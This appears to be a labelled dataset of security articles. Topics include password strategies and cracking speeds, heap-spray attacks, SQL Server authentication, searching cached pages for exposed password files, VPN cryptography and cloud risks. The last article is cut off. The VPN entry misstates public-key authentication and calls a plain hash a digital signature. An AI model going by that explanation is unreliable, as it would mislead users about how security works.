{"text": "Everyone and their mother has a password security strategy, some better than others. Choosing the right one means weighing security against convenience so you can stay safe without losing your mind. But what's the best balance? Is it the same for everyone? With the help of a security expert, I decided to find out.\nOver the years, we've posted several password security tips, tricks and techniques ranging from the simply memorable to the perfectly paranoid. Although I've always used strong passwords, many of my coworkers went through great lengths to heighten their security far beyond mine. I knew my passwords needed an audit, but the security measures put forth by my colleagues seemed so frustrating and inconvenient. I wanted safety but without all the hassle. To find out the best combination of security and convenience, I decided to audit all the methods we recommend with the help of security and investigations expert Brandon Gregg. Before we can get started, however, we need to know what makes our passwords vulnerable.\nThe Three Variables That Contribute to Weak Passwords\nBrandon explained that weak passwords have three variables, and each makes them more vulnerable:\n- An easily guessed/cracked password: Brandon says, \"With Amazon EC2, GPUs*, and software like Accessdata's Distributed Network Attack (DNA), guessing half a billion passwords per second is easy. My personal record is 370 million guesses per second—not crazy, but better than most Law enforcement agencies. It also appears that some sites, such as Twitter, allows these kinds of brute force attacks against user accounts as long as the ‘password guess' is from randomized IP address each attempt.\" With so many guesses possible per second, you don't want an easily crackable password. Later in the post, we'll discuss which methods produce the most secure and reliable passwords.\n- An easily forgotten password: Your passwords don't help you if you can't remember them. Brandon says, \"Always resetting your hard-to-remember password just leads to more mistakes and exposures in the future.\"\n- One password provides access to many sites: Using the same password for everything means that if a hacker cracks one of your accounts, they've cracked them all.\n*GPUs or graphics cards are used to brute force passwords due to how they tackle parallel calculations. One GPU or clusters of GPUs can be made fairly cheaply and are multiple times faster at guessing passwords than their CPU brothers.\nEliminating one or two of the three variables doesn't require much effort, but removing all three causes the higher level of inconvenience I, and many people, hope to avoid. While no security strategy lacks vulnerabilities, in this post we'll audit several types of passwords, from weak and strong and methods of managing them to find out what's the best for convenience and what's the best for security.\nThe Four Levels of Password Security\nLeast Secure: Simple Alphanumeric Passwords\nThe weakest type of password involves combinations of numbers and letters, or just one of each. It may be easy to remember a word, your phone number, or both, but these passwords are easy to crack. Existing software has no trouble guessing dictionary words, phone numbers, or even combinations of both—especially when the password is under eight characters.\nThat said, you won't forget a simple password. If you use it for every account you own, you won't have to remember much at all. Of course, this is extremely insecure. If using a simple and short password, especially across many accounts, you're not far off from using no password at all. For more on why weak passwords are easy to crack, read this.\nExamples: charlie, hotstuff, 8675309, mary212\nSomewhat Secure: Complex 8+ Character Passwords\nComplex passwords require more effort to type, but they also require far more effort to hack. A complex password consists of at least eight characters. You should include capital and lowercase letters, at least one number, and at least one symbol (e.g. !, ?, @, etc.). You should also avoid a single dictionary word (e.g. pantomime → p@nt0m!me). Using a phrase as a starting point is better, but again, not perfect (e.g. \"I love goats → iLuVg0@ts).\nThis method fails when you use a unique password for every site because you have to remember many, many complex strings of letters, numbers, and symbols.\nExamples: t@lk4Ev3r!, iLuVg0@ts, b3stFr13ndS4eVer?!\nVery Secure: A Common Complex Base Password with Unique Identifiers\nYou can't easily remember a lengthy, complex password, so utilizing different ones for every account just doesn't work (unless you're also using a password manager, but we'll get to that later). Remembering just one, however, makes things much easier. It also makes your password less secure unless you add a unique identifier. That unique identifier can relate to the site so you won't forget it. For example, if you used iLuVg0@ts as your common base password and you wanted to create a password for Gmail, you could use iLuVg0@ts-gmail. Brandon prefers this method over others:\nHaving a common base password plus the site name actually removes all three variables. Due to length it won't be cracked by a dictionary or brute force attack. If Linkedin gets compromised your Gmail will remain safe and lastly you aren't going to forget your password. It's the best option available.\nExamples: iLuVg0@ts-gmail, iLuVg0@ts-linkedin, iLuVg0@ts-facebook\nOf course, if a savvy hacker managed to crack one password they might figure out the others. Brandon suggests:\nIn my own passwords I mix up the \"site\" password not with a direct label of GMAIL or LinkedIn, but with email for gmail or resume for linkedin. Something again that is easy to remember, but hard to guess if your account is compromised.\nExamples: iLuVg0@ts-email, iLuVg0@ts-resume, iLuVg0@ts-friends\nWith common basename passwords, you have another secure option: using a three word phrase with spaces (e.g. \"goats love gmail\"). This method may seem less secure because it includes simple dictionary words, but it works because spaces are in play. (You can read more about the three word method here.) Brandon notes that this method sometimes fails because of how sites and applications restrict your password options:\nThe three word method is a good idea, but limited by many of the websites and applications you use. It solves the hard to crack problem and easily compromised issue, but not the easy to remember. Why, you ask? Most sites don't allow spaces as a special character, so you are stuck using \"goats@love@gmail.\" Some sites even prevent the number of special characters you use, so you might have one application that allows password A and another that does not. The next thing you know you have five different password styles and you can't remember which style belongs to which login.\nExamples: goats love gmail, goats@love@facebook, goats!love!pinterist\nAs mentioned, neither solution comes without vulnerabilities. If all your sites allow spaces or don't restrict special characters, the three word method offers greater simplicity. Either way, a common base password and a unique identifier offers both security and convenience.\nExtremely Secure: Two-Factor Authentication and Passwords Even You Don't Know\nNo password is more secure than a lengthy, complex string of characters that nobody knows. The obvious problem? You can't enter a password you don't know. Password managers like LastPass solve this problem by storing all your passwords in a single database, unlocked by one unique password of your choosing. Of course, as Brandon points out, this comes with one major flaw:\nPersonally, I am fearful of any password manager used to centralize my accounts. As someone who \"monitors\" many systems I can personally tell you that if I capture your LastPass master password it's like opening up a nicely wrapped present. I was only going to target your Twitter account, but you just gave me a one stop shop to all your accounts, even the banking accounts I had no idea you had. Thank you LastPass and the lazy user.\nUsing a password manager suffers from a similar vulnerability to using the same password for every site: you crack one, you crack them all. While LastPass, in particular, makes great efforts to keep your passwords safe, you're putting yourself at risk by using one password to rule them all. The solution? Two-factor authentication, something you may have heard about recently. Brandon explains how it works:\nTwo-factor authentication adds a layer of security that is almost impossible to bypass. After using one of the password options above, Google (and other sites) send a text message to your phone. Not only is it hard for hackers to obviously be watching your phone (unless this installed FlexiSPY or other cell monitoring tools) it gives you a heads up to being attacked. If you suddenly get a text message with an authorization code at 2:00 AM, it might be a sign your ex-girlfriend is trying to get into your account.\nWhen using a password manager like LastPass, you should enable two-factor authentication or you are, as Brandon puts it, potentially offering up your passwords as a nicely wrapped present. While we often argue this method secures your accounts better than any method, it also creates the most inconvenience. You'll need to decided whether that inconvenience matters to you or not.\nHow Do I Choose the Best Password Security for Me?\nSecuring your accounts means choosing a balance between convenience and protection. If you're willing to tolerate regular security checks and use randomly-generated passwords you don't know, you can put your paranoia to rest. Most Lifehacker writers and editors use this level of password security because they don't want to assume the risk and find little inconvenience in the extra effort. In fact, many adjusted to the new methods and haven't found two-factor authentication to be inconvenient at all. You may feel the same way.\nPersonally, I find this method excessive and too much of a burden. As a result, I've opted for our third level of security (\"Very Secure\") described above for two reasons. First, using a method that requires a password manager involves trusting someone else with your data. When you give someone else your data you take a risk that they may lose it or share it (whether intentionally or not). If you've ever told a friend a secret, you understand the potential risk. The only well-kept secret is the one you keep yourself. While you can't avoid sharing your information entirely, as that would lead to a horribly insulated life, I believe in keeping how much you share that information to a minimum. Second, I want reasonably easy access to my data and I'm okay with assuming some risk. As someone who's had his fair share of hardships, I don't believe in trying to live life risk-free. Bad things happen. We should take reasonable measures to prevent them, but sometimes they still happen. To me, a tiny bit of added security isn't worth the inconvenience.\nWhat should you choose? Brandon sums up the decision-making process nicely:\nSecurity is not always about who has the best alarms, tallest fences, or latest technology. There are many variables in security that often times people overlook including cost and convenience. We can lock down our computers, phones, and Internet with full encryption, bio-readers, and multi-level authorization, but if you don't assess your own realistic risk you can easily weigh yourself down by high costs and slow access. While two-factor authentication is currently one of the best methods of protecting your data, the added time for the second level of authorization can become a nuisance and maybe overkill. Are you afraid of China snooping in your Gmail? If not, no two-factor authentication is needed. Is there a real concern your savings account can be hacked? Use two-factor authentication on all banking sites that offer it. Better understand your risk to better choose the level of security you need.\nThe level of risk you want to take depends on your personal needs and the level of risk you're willing to take. Just remember—while you can implement extreme security protocols, nothing prevents the possibility of a hack. Everything is vulnerable. Back up your data. Keep a close eye on your accounts. Security involves more than locking everything down with good passwords. You should prepare yourself for the worst. In the meantime, however, lock down your accounts in a way that's secure enough for you and fits well into your life.\nSpecial thanks to Brandon Gregg for his expert advice. Brandon has worked investigations for numerous Fortune 500 companies over the last 12 years investigating theft, fraud, organized crime, corporate espionage, and many high profile cases as well as being an educator, published author, and featured speaker on surveillance, computer forensics, complex investigations, and ethical hacking. You can find out more about him here.", "label": 1}
{"text": "Making Abstract Data Types Abstract\nAn approach to make systems safe from heap spray attacks\nDoug Tygar is an expert on computer security in the broad sense. It started with his thesis work on building secure operating systems. This work was notable for its unique approach to this fundamental problem, partly driven by the views of his famous advisor Michael Rabin. Since then he has continued working on all aspects of security: including attacks against intrusion detectors themselves, covert channels, and spam and botnet protection.\nToday I want to talk about some attacks on software systems and an attempt to try to model them formally, and perhaps prevent them. This is related to some research of Doug’s, but the ideas here are work still in progress.\nDoug started his career as junior faculty at CMU, where he taught a class on security. One thing about CMU students, in general, they are good “hackers.” Even theory students are known for being able to write code, and the systems students are seriously good.\nAt the start of the class, Doug announced to his students he had a great password and that no one would be able to break it. I am not sure why he challenged the class, but he did. It was not a good idea—do not wave red flags at a bull—or in this case at a class full of them. The game was on.\nIn a couple of days the class had figured out his password. The problem they solved is given a “one-way” function and a string , find a string , the password, so that\nThey had used a standard dictionary based attack: try all the words from some dictionary, and test each to see if . Usually, these programs are a bit more clever and can get a password like “99hello” quite easily.\nThey told Doug his password, and so he changed it to a better one. Game on. This they still cracked, even though it took much more computer time, but they still got it. Now Doug announced to his class that he had picked a password that would foil these simple dictionary attacks.\nBut, he made a small error, he told them how he had selected the password. He wanted a password he could remember, so he used his knowledge of Japanese. He told them he had used a Japanese phrase as his password. He smiled to the class, and told them to forget about trying to crack this password.\nThey decided to attack his password, Japanese or not. Of course he had to write his phrase as a series of roman letters, since the login routine did not accept Japanese characters. There are standard ways to encode Japanese into roman letters, see this; thus, they built their own special dictionary for Japanese phrases. It was a lot of work, but in a week or so, and with some luck, they again broke his password.\nDoug was getting tired of this game of password cracking: he wanted them to work on more important security projects. So he told his class he had changed his password to a random string of letters:\nLet’s move on, I win.\nOf course this was not the end, recall these were CMU hackers. They knew the attacks using dictionaries were out, but there were other ways to get passwords. In those days, this was many years ago, the CMU department was using workstations that allowed users to listen in on all the ethernet traffic on the network. Essentially they could sniff the packets as they went by, whether they were meant for them or not.\nSo they wrote a program that examined each packet. The goal was to find packets that looked like they were part of a remote login. Each time they found one they got a and checked to see if it was Doug’s password. After a few days, a packet went by with his password, and they had him. The key insight was that the operating system did not encrypt passwords when logging into remote machines.\nAfter Doug heard they had his password again, he gave up. Game over. You win. He told them his new password—this stopped all attacks. And the class moved on to more interesting issues concerning the security of systems.\nLet’s move on to a class of interesting attacks on systems.\nOne of the fundamental ways that malware takes over a system is this:\n- First, the malware runs in normal mode and does something legal, but something that will help it break your system. Often this involves writing some data somewhere in memory by legal means.\n- Then, the malware uses some bug, and jumps to a given location in memory.\n- Now, the malware is running its own code and does whatever it wants to do to you.\nThe second step is critical. Without the bug or hole in your system the malware would likely be unable to run the code that it wants to run. However, modern software systems are large, complex, and distributed: all make “preventing the jump” step very hard. Thus, the need for methods that detect or even protect systems from this type of attack.\nIn early attacks the malware could control the jump step—it could decide where to jump to exactly. The software bug that was exploited allowed the malware to jump to a specific location. This made the malware’s job pretty easy: place its code there and jump.\nHowever, as software engineers have become more aware of attacks, there are less predictable ways for malware to take control. Today many bugs allow malware to jump into memory, but not to a specific location. The challenge is simple: given that malware can jump into memory, how does the malware make sure it can jump into its code? It would be useless, from the malware’s point of view, to jump into the middle of legal code or data. Likely, this type of jump might crash the system, but would not allow the malware to take over.\nHence the creation of heap spraying. Sounds like a garden product:\nuse “heap spray” and all your weeds will go away.\nThe idea of heap spraying is simple, since the jump is unpredictable, place many copies of the malware code all over memory. Then, when the jump occurs, there will be a good chance that the malware jumps into its own code.\nThere is one further simple idea to make this work. The malware wants to get to the start of its own code—jumping into the middle is not very useful. So nop sleds are used. Imagine memory is filled with pieces of code like this:\nHere is typically a “nop.” Note, now as long as the jump hits the sequence the malware’s code will get executed properly. Here is an example of how this type of attack looks:\nThe Problem: Abstract Data Types\nI see the problem as: the malware is given legal access to some abstract data type. During the first part of the attack the malware can do any legal operations on the data type. In the above example, the malware just filled an array—legally—with its sled and code. However, later on the malware will do the jump step. This will take it into the memory and perhaps with luck it will hit a nop sled and then execute its malware code.\nThe problem is: the abstract data type is not abstract. A white hat programmer only uses the correct calls to the data type; on the other hand, the malware jumps into the middle of the data type. This is an abuse of the data type, and is how the malware gets control of the machine.\nHere is a “solution” to the heap spray problem based on the use of theory type ideas. I say “solution” for the following reason: unless the exact attacks are clearly defined the solution can still fail—more on this later on. I do think, however, that ideas from theory could easily play a bigger role in the security of modern systems.\nI will explain the idea for the simple data type of a one-dimesional array of integers. Imagine some scripting language that hat allows programs to access arrays. They can execute to write the array value, and execute to read the array value.\nThe implementation of the array type is changed very slightly. I need to explain how it is created, read, and written.\nCreate Array: A random value integer is selected. The array is set up as usual: let denote the memory locations where the array is stored.\nWrite Array: Suppose is to be written into . Then, execute\nRead Array: Suppose is to be read from . Then, execute\nand return the value .\nThe point of this is the values stored in the actual memory are not the “raw” values sent to the data type. They are scrambled to make them appear random. Clearly, a jump now will hit,\nThus, a malware program that fills memory with nop sleds and then jumps is likely to hit random garbage. This may cause an exception or even a crash, but will unlikely allow the malware to take over the system.\nDoes This Work?\nI believe the above is a pretty good “solution.” However, it could be defeated if the array allows access to undefined locations. This shows how careful one must be in designing such “solutions.” I think whether this particular idea is useful or not is less important than the idea that we may be able to use crypto like methods to protect software.\nThe malware could learn the value of as follows. It would access some yet-undefined location and get back where was the value left in the location. For example, if , then the malware would learn , and this would defeat the method. Even if were arbitrary, the malware could use this approach to try to learn the secret random value .\nTo avoid this attack there are at least two methods. We could assume that the data type does not allow the access of undefined values. It can return “undefined value,” but must monitor whether a location is defined or not. The other possibility is to use a more complex crypto solution. The advantage of the latter is the data type need not watch and check that no read occurs to a location that is undefined. I will discuss this method and related issues in a later post.\nStopping Heap Spray—Other Approaches\nThere are several other methods for protecting against heap spray attacks. One project is called Nozzle and is work of Paruj Ratanaworabhan, Benjamin Livshits, and Benjamin Zorn of Microsoft. This method is really an intrusion detection method: it watches the memory and reports if it detects the presence of objects that contain executable code. One problem with this method is the existence of false positives. They note that often data stored by programs is legal code.\nAnother project is called BuBBle and is the work of Francesco Gadaleta, Yves Younan, and Wouter Joosen. They use a method very close to one I am suggesting. They replace parts of memory by random pieces—these random pieces cause the memory left by the attacker to be gone. This will cause the malware to cause an exception when it attempts to execute that part of memory. One problem is they only modify some of memory, and second is they need additional storage for the actual values of the modified memory.\nCan theory help in other ways in building secure operating systems? Does the idea here have any use in fighting heap spray attacks? Can we use more crypto in making secure systems?", "label": 1}
{"text": "Endpoint Authentication Types\nThe process for endpoint authentication involves granting permissions to allow users to connect to endpoints that are created on the server and specifying how authentication is performed.\nHow authentication is performed is specified by using the AUTHENTICATION clause of the CREATE ENDPOINT statement or the ALTER ENDPOINT statement. The AUTHENTICATION clause provides the following options for specifying the authentication type:\nAnonymous authentication on an endpoint is not supported. For user access to an endpoint, the user must be a valid authenticated Windows user, either a trusted Windows user or a member account on the local computer.\nBasic authentication is one of the two required authentication mechanisms in the HTTP 1.1 specification. Basic authentication is made up of an Authentication header that contains the base64-encoded user name and password separated by a colon. For more information, visit http://www.ietf.org/rfc/rfc2617.txt.\nConsider the following when you specify BASIC:\nThe PORTS value cannot be set to CLEAR.\nCredentials sent as basic HTTP authentication must be mapped to a valid Windows login.\nBasic authentication should only be used as a last resort. Because it uses easily decoded base64-encoding, if basic authentication is specified, the instance of SQL Server requires that a Secure Sockets Layer (SSL) port be used for HTTP connection. Basic authentication can be used in situations in which the user that is granted permissions to the endpoint is a local user on the server computer itself.\nDigest is the second authentication mechanism required by HTTP 1.1. This authentication is made up of the user name and password. This is then hashed with MD5, a one-way hashing algorithm, and sent to the server. The server has access to either the raw password, or a stored MD5 hash that was created when the password was set. The server can then compare the stored calculated value to the one provided by the client. This way, the client can prove that it knows the password without actually giving it to the server. For more information, visit http://www.ietf.org/rfc/rfc2617.txt.\nThe credentials sent as part of a digest authentication over HTTP must be mapped to a valid Windows domain account. Local user accounts are not supported for Windows-based digest authentication.\nFor security reasons, Windows-based digest authentication only supports MD5-sess encryption over domain controllers that are running under Windows Server 2003.\nNTLM is the authentication mechanism supported by Windows 95, Windows 98, and Windows NT 4.0 (client and server). This authentication mechanism is a challenge-response protocol that offers stronger authentication than either basic or digest. NTLM is implemented in Windows 2000 and later versions by a Security Support Provider Interface (SSPI). For more information, see Microsoft NTLM.\nKerberos authentication is an Internet standard authentication mechanism. Kerberos authentication is supported in Windows 2000 and later versions by an SSPI.\nWhen Kerberos authentication is used, the instance of SQL Server must associate a Service Principal Name (SPN) with the account it will be running on. For more information, see Registering Kerberos Service Principal Names by Using Http.sys.\nFor more information about Kerberos authentication, see Microsoft Kerberos.\nEndpoints configured to support integrated authentication can respond with either of the following authentication types as part of the authentication challenge: Kerberos or NTLM.\nUnder this configuration, the server will try to authenticate the client with whichever type the client uses in requesting authentication.\nIf that process fails for one integrated authentication type, the server will terminate the connection for the client. The server does not fall back to trying the other authentication type.", "label": 1}
{"text": "This week, Intel unveiled its new Xeon Phi coprocessor, which puts an astonishing 50 x86 cores onto a single PCI-connected card. The term \"coprocessor\" should be understood in context. Every one of the Phi's cores can boot Linux and run any x86 software. However, the card itself needs to plug into a system that has an independent CPU, which basically oversees the Phi's operations. Hence, the coprocessor appellation. The first model to be released in Q1 of next year will have 50 cores, and the follow-up coprocessor slated for release in mid-2013 will have 60 cores. Each processor supports four threads, making for 200 threads for the initial Phi. The cores run at 1.05 GHz and sport a 512-KB L2 cache each. They collectively share 8 GB of GDDR5 memory.\n- Transitioning to Multicore Development\n- Crime Prediction and Prevention: A Safer Public through Advanced Analytics\nThe aim of these processors is initially to attack tasks that are highly threadable. The Phis compete most directly with GPU processors, especially those from Nvidia. Even though they offer fewer threads than do GPUs, they deliver compelling programming advantages. If you've used CUDA or OpenCL, you know that programming GPUs is a descent into a netherworld of peculiar and rigid limitations. You're always acutely aware that you're doing something that the processor was not built to do. For example on Nvidia chips, there are multiple kinds of memory and only certain things can be done with each type of memory. Moreover, data has to be presented for calculation very carefully; otherwise, the processing lift of the GPU will disappear entirely. All of these problems go away with the Phi. It's a pure x86 programming model that everyone is used to. It's a question of reusing, rather than rewriting, code. This greater simplicity will be extremely appealing to many users who have spent long nights hacking code to get the GPUs to deliver properly. (The OpenACC initiative that we've covered several times recently is an industry effort to deal with this complexity.) The Phi can be programmed using all the typical parallel approaches: OpenMP, MPI, and Intel's own TBB and Cilk+. Intel has added some extensions to OpenMP to do the data offloading from the CPU to the Phi, but the company expects that the directives will be included in the upcoming OpenMP 4.0 spec.\nThe coprocessor consumes around 225 W of power, which is a surprisingly low number given the number of cores. The heat generated when the Phi is running is low enough that the device can be passively cooled. As I mentioned, the Phi comes as a PCIe 2.0 card. The PCI connection means that the data transfer process from the CPU to the GPU is a limitation (as it is on GPU computing devices) because, at full tilt, it can transfer a maximum of 16 GB/sec. (By comparison, the Phi cores access the 8 GB of internal memory at 320 GB/sec.)\nSuggested reatail pricing for the initial model is $2649, with subsequent models expected to cost less than $2000. At this pricing level and with the ability to run x86 code without rewriting, the Phi most directly disrupts Nvidia's CUDA project and AMD's OpenCL work. At the moment, both Nvidia and AMD enjoy a price advantage in their GPU coprocessors, but it's not clear that the advantage is substantial enough that sites will continue preferring those solutions in light of the cost of rewriting code to run on their GPUs. Intel is leveraging its massive x86 installed base.\nI expect Phis to show up initially exactly where the GPUs are mostly used today for computation: in servers used by academia, research, and high-volume data transformation. Eventually, though, I expect the coprocessors to move down to workstations and subsequently to high-end desktops.\nAn oft-asserted but dubious contention made in the popular press is that desktops today are so powerful that they are effectively supercomputers. Abstractly, this might be true if you compare them with their forbears of some years ago on computing power alone. However, supercomputers have (for well over a decade) been primarily highly parallel designs. Thus, the metaphor lacks a key elements it strives to express. However, with the advent of Intel's Phi coprocessor, this gap is closed and indeed we can expect to have true supercomputing power on servers and desktops soon at a price everyone can afford. As such, the Phi heralds a new era in computing.", "label": 1}
{"text": "How to stay safe on the web\nThere are all kinds of scams, viruses and other dangers out there. Here are simple steps you can take to protect your computer and personal information.\nTable of Contents\nKeep your software and operating system up-to-date\nSoftware updates contain vulnerability patches that protect your computer and personal information.\n- Update Firefox: To check for Firefox updates, go to the top of the Firefox window, click the menu and select .To check for Firefox updates, go to the top of the Firefox window and click the button, go over to the menu and select .To check for Firefox updates, go to the menu bar, click the See menu and select .Update Firefox to the latest version for details.\n- Update your plugins: Go to our Plugin Check page and follow the links to update any plugins that are out of date.\n- Update WindowsUpdate OS XUpdate your system: Make sure you have all of the latest security and stability fixes. Go to the menu, select and then .Go to the menu and select .Go to the menu, down to and select .\nCheck your Firefox settings\nFirefox has many ways to help you stay safe on the Web.\n- How do I tell if my connection to a website is secure?\n- Disable third-party cookies in Firefox to stop some types of tracking by advertisers\n- Create secure passwords to keep your identity safe\n- Where are my logins stored?\n- There are also a lot of Firefox extensions that may be helpful.\nFollow best practices to protect your information\nHere are some handy tips to protect yourself.\n- Remember that YOU decide what information about yourself to reveal, when, why, and to whom: don't give out personally-identifiable information too easily; set your privacy settings in your social networking account; beware of sites that offer some sort of reward or prize in exchange for your contact information or other personal details.\n- Be conscious of Web security: never submit a credit card number or other highly sensitive personal information without first making sure your connection is secure; be on the lookout for \"spyware\"; use secure passwords and protect them with a master password.\n- Keep a \"clean\" e-mail address: use some pseudonymous or simply alternate address, and keep your main or preferred address only on small, members-only lists and with known, trusted individuals.\n- Do not reply to spammers, for any reason.\n- Realize you may be monitored at work: avoid sending highly personal e-mail to mailing lists, and keep sensitive files on your home computer.\n- Be conscious of home computer security: Turn off your computer when you are not using your Internet connexion; secure your Wi-Fi network with a strong encryption (WPA or WPA2) ; use a firewall.", "label": 1}
{"text": "A firewall is a set of related programs, located at a network gateway server, that protects the resources of a private network from users of other networks. (The term also implies the security policy that is used with the programs.) An enterprise with an intranet that allows its workers access to the wider Internet installs a firewall to prevent outsiders from accessing its own private data resources and for controlling what outside resources its own users have access to.\nBasically, a firewall, working closely with a router program, filters all network packets to determine whether to forward them to their intended destination. A firewall also includes or works with a proxy server that makes network requests on behalf of workstation users. A firewall is often installed in a specially designated computer separate from the rest of the network so that no incoming request can get directly at private network resources.\nThere are a number of firewall screening methods. A simple one is to screen requests to make sure they come from acceptable (previously identified) domain names and IP addresses. For mobile users, firewalls allow remote access in to the private network by the use of secure logon procedures and authentication certificates.\nHubs, Switches and Routers\nHubs, Switches and Routers are all devices that direct data between computers and other devices on your network. They come both in the standard CAT5 or CAT6 connection and wireless, which is able to relay data to your more mobile devices.\nNetwork cards fit in computers, laptops and printers to connect them to the rest of the network. Most network cards use a direct connection using a CAT5 cable, similar to a telephone cable. For laptops and mobile devices such as Pocket PC's and Palm Pilots, or in areas that installing network cables might be costly or dangerous, it may be beneficial to use wireless network cards.", "label": 1}
{"text": "Computer hackers have adopted a startling strategy in their attempts to break into websites. By using the popular search engine Google, they do not have to visit a site to plan an attack. Instead, they can get all the information they need from Google's cached versions of web pages, say experts in the US.\nOne way that hackers can break into a website is by hunting for private pages that contain the usernames and passwords required to access secure parts of the site. These pages are usually hidden from the casual browser because there are no hyperlinks to them on the web.\nBut sometimes websites contain hidden hyperlinks or indexes that point to these private sites. These links may be inserted by faulty software, or they may be created by the owner for temporary use and later forgotten or not properly deleted. Either way, they are serious security loopholes.\nHackers usually hunt for these private pages by trial and error, an activity that an alert webmaster can spot by monitoring traffic on supposedly private parts of the site. But search engines now make this kind of trawling unnecessary, says Johnny Long, a professional hacker based in the US who is hired by companies to test their security.\nSearch engines build their databases by systematically following the links they find on web pages. The search engine then records the contents of each page. So if a website contains a link to a sensitive page, a search engine will record it.\nThese pages would still be hard to find if web servers did not often use the same name for pages that contain passwords and other sensitive information. For example, one common filename for passwords is \"bash history\". Long says an obvious combination of search terms would include the terms \"bash history\", \"temporary\" and \"password\".\nSince Google makes its cached pages available, hackers can access this information without alerting a webmaster, even if the data has since been removed from the web. Long plans to outline the technique this week at Defcon, the annual hackers' conference in Las Vegas.\nGoogle says it bears no responsibility for the way the information it collects is used. \"Our search tools are very useful to researchers. There is not a lot we can do to prevent hacking,\" says a company spokesman.\nThe responsibility for securing a site lies with the people operating it, says Danny Sullivan, editor of the website SearchEngineWatch.com: \"Search engines make it easier for everyone to gain information, hackers included.\"\nIf you would like to reuse any content from New Scientist, either in print or online, please contact the syndication department first for permission. New Scientist does not own rights to photos, but there are a variety of licensing options available for use of articles and graphics we own the copyright to.\nHave your say\nOnly subscribers may leave comments on this article. Please log in.\nOnly personal subscribers may leave comments on this article\nAll comments should respect the New Scientist House Rules. If you think a particular comment breaks these rules then please use the \"Report\" link in that comment to report it to us.\nIf you are having a technical problem posting a comment, please contact technical support.", "label": 1}
{"text": "Securing Virtual Private Networks (VPN), Page 2\nAsymmetric Encryption, or public key encryption, depends on a pair of keys called public key and private key; hence the name. The keys are selected such that, if data is encrypted through key 1, it can be only decrypted through key 2 and vice versa. Of the two keys, we tell about one to everybody and call it a public key. The other is kept private for decrypting and called a private key. For example, our e-mail account has a public e-mail address that we give to everyone we want to but we won't tell the password to anyone.\nSuppose a person named Linda is a broker and she gets a request mail by James Anderson for buying some stock shares for his company. She performs all the arrangements and sends a confirmation mail to James. In the end, she sends a bill to him for the payment; at this point, James completely denies that he has ever sent a mail to Linda for any stock shares. Now what should Linda do? She is in extreme trouble because there is no clue to prove that James was the actual e-mailer.\nThe solution is provided by the use of public key encryption; if Linda has encrypted the data by a public key, it can be decrypted only through Linda's private key which should be told only to James, so when James replies to the confirmation mail for the shares, it is known for sure that the answering person is no other then James Anderson and he is caught. This is source authentication.\nIf we use the hashing scheme, such as MD5, on our data and generate a hash value for it at the source computer and send it along the data to the target, the destination computer will also compute its hash code for the received data. If the hash generated by the destination is same as the one received by the source, our data integrity is preserved; in other words, the data has reached its destination without any change or loss. This hash code is called a digital signature when sent with e-mail data.\n- Data Integrity\n- Data origin authentication\n- Replay prevention\n- Limited traffic flow confidentiality\nReplay prevention means that if somebody gets to know the keys by some means and resends your messages again or if someone gets to know the user name and password of your account, he or she can directly learn all your important business transactions and deals with others and can enjoy full authority to make other deals with them on your account using your name.\nIKE is a mechanism in IPSec where we exchange the key. It is a hybrid protocol that implements Oakley and Skeme key exchanges inside the ISAKMP framework. While IKE can be used with other protocols, its initial implementation is with the IPSec protocol. IKE provides authentication of the IPSec peers, negotiates IPSec keys, and negotiates IPSec security associations. The main features of IKE are as follows:\n- Negotiates policy to protect communication\n- Authenticated Diffie-Hellman key exchange\n- Negotiates (possibly multiple) security associations (SA) for IPSec.\nDiffie-Hellman is a public-key cryptography protocol that allows two parties to establish a shared secret over an unsecured communication channel. Diffie-Hellman is used within IKE to establish session keys. 768-bit and 1024-bit Diffie-Hellman groups are supported.\nSecurity Association (SA) combines the agreed upon principles for VPN communication. This is done by IKE. The secret key exchange is the main process so that the dependent data to be delivered is secured.\nIsakmp + oakley is the IKE policy that we define to start the encryption process. The Internet Security Association and Key Management Protocol (isakmp) is a protocol framework that defines payload formats, the mechanics of implementing a key exchange protocol, and the negotiation of a security association. Oakley is a key exchange protocol that defines how to derive authenticated keying material. Skeme is a key exchange protocol that defines how to derive authenticated keying material, with rapid key refreshment.\nMD5 (Message Digest 5) is a hash algorithm used to authenticate packet data. HMAC is a variant that provides an additional level of hashing. The Data Encryption Standard (DES) is used to encrypt packet data. IKE implements the 56-bit DES-CBC with Explicit IV standard. Authentication header is used for data integrity and source authentication whereas encapsulating security protocol is used for confidentiality.", "label": 1}
{"text": "Security in the Cloud\nSecurity risks are a concrete expression of the lack of control a business faces when considering moving critical business systems to the cloud. From the perspective of the enterprise, there are seven major risks to be considered. Of these seven, four can be easily controlled or mitigated by the Enterprise. The remaining three remain the responsibility of the cloud provider of which the Enterprise has little real control, other than voting with their wallet. It may be argued that the Enterprise should make “demands” of the cloud provider through the use of contracts or third party audits, but in reality the market will determine the amount of security provided to Enterprises by cloud service providers and the level of acceptable risk. It may turn out that the cheaper price of cloud computing comes with necessarily increased risk, which may be a self-limiting factor in itself to the pervasive use of cloud computing by Enterprises.\nWe outline the top security risks as follows:\n1. Insecure, Porous APIs: Most cloud services offer two categories of web-accessible APIs: Those based on web services (called SOAP) and those based on pure HTTP (called REST). Increasingly, some cloud providers are offering only REST style APIs which lack robust “Enterprise class” message level security and authentication mechanisms. Some APIs, such as the Twitter API are purposely designed for rapid development and allow and even encourage the use of unprotected user credentials which are more susceptible to man in the middle or replay attacks. While some providers, such as Amazon.com offer strong authentication mechanisms, it’s not clear yet how well these APIs stand up to content-based threats such as code injection, denial of service attacks, script injection, or malicious XML content. Moreover, it’s also not clear how much trust should be placed in data received by the Enterprise from a cloud API for potential threats. A compromised cloud service API session may be a direct avenue for an attack. Internal information systems exposed to the cloud at the API layer offer a universal tunnel for a savvy attacker. Without explicit protection, cloud APIs essentially expose previously guarded Enterprise data across the Internet into the hands of a third party. Moreover, for IaaS systems that expose XML based APIs for image management, these management APIs also require strong authentication and access control as an attacker may conveniently replace a trusted machine image with a rouge one.\n2. Logical Multi-Tenancy: With shared cloud computing infrastructure, the division of Enterprise data is now logical rather than physical. This logical separation is typically achieved through the use of virtualized infrastructure which is a cheap and easy way to support a multi-tenant architecture at the cloud service provider. The perceived risk in this scenario is for an attacker to subvert the logical division provided by the guest virtual machine and gain access to the data of another tenant. A number of attacks on virtual machines, from detecting the presence of a hypervisor to running arbitrary code on the host have been documented3. These attacks highlight the uncertain security of multitenant, shared environments for critical Enterprise data. An Enterprise horror story would be an attacker signing up for a “free” account at the cloud service provider, detect the presence of a virtual machine and “escape out” of the VM instance to access the physical server operating system and potentially gain access to the Enterprise data. Technology such as Intel® Trusted Execution Technology (TXT) are available that can mitigate this type of attack, but responsibility for implementation ultimately still lies with the 